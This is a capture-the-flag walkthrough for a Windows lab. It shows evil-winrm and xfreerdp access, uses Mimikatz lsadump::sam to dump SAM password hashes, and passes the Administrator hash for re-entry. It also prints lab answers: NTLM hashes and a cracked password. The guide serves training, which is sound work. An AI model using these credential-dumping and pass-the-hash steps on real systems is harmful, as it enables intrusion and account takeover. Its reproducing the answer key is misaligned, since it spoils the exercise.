command syntax: net user username

## As we have our user on target machine with remote managment so we user evil-winrm to connect to the target 

you can install this by using this command in kali 

command: sudo gem install evil-winrm

OR 

you can clone it through git hub using this link

link: https://github.com/Hackplayers/evil-winrm


## Now we evil winrm and our user so we can connect it using command 

command: evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP 

## In my case i have sshuttle for reverse connection 

## Using this i am connected to the target machine 

### Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm.




### Now let's look at connecting over RDP for a GUI environment.

There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:

command: sudo apt install freerdp2-x11


### As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:

command: xfreerdp /v:IP /u:USERNAME /p:PASSWORD

## this gave us a GUI of the machine we can do alot more then evil-winrm

## some userfull flags are


1) /dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process

2) /size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution

3) +clipboard -- enables clipboard support

4) /drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: /drive:.,share, with the period (.) referring to the current directory

## When creating a shared drive, this can be accessed either from the command line as \\tsclient\, or through File Explorer under "This PC":

## Note that the name of the share will change according to what you selected in the /drive switch.

##  A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:


command: xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share



## With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:

command: \\tsclient\share\mimikatz\x64\mimikatz.exe

## Note: if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with 

command: sudo apt install mimikatz

## With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:

command: privilege::debug

command: token::elevate

## If we want we could log Mimikatz output with the log command. 
For example: log c:\windows\temp\mimikatz.log

## This would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.


## We can now dump all of the SAM local password hashes using:

command: lsadump::sam

## Near the top of the results you will see the Administrator's NTLM hash:

## that is in my case 

$ mimikatz # lsadump::sam

Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

##

Q3) What is the Administrator password hash?
A) 37db630168e5f82aafa8461e05c6bbd1

Q4) What is the NTLM password hash for the user "Thomas"?
A)  02d90eda8f6b6b06c32d5f207831101f

Q5) What is Thomas' password?
A) i<3ruby


## 

In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.

For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.

To do this we use the -H switch instead of the -p switch we used before.

For example:

command: evil-winrm -u Administrator -H ADMIN_HASH -i IP



======================================================================================================================================================

## Aghh That's it From now on you have to do it on your on.Doing all that give me so pain so i ignore making writeup and complete the room so if you need help from there 
so DM me on Discord.
